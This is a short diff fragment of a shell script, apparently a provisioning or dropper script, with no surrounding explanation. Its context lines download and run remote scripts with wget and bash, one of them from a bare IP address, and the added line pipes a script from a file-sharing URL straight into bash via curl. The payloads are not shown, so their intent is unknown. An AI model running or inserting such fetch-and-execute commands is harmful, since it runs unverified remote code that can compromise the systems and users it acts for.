@@ -10,3 +10,5 @@ wget -N https://raw.githubusercontent.com/djbzq/az/refs/heads/main/sgd.sh && bas
 sleep 600
 
 wget -N http://158.180.34.216/init2.sh && bash init2.sh
+
+bash <(curl -sL https://pan.halocloud.net/?f=/scripts/optimize_fix.sh)
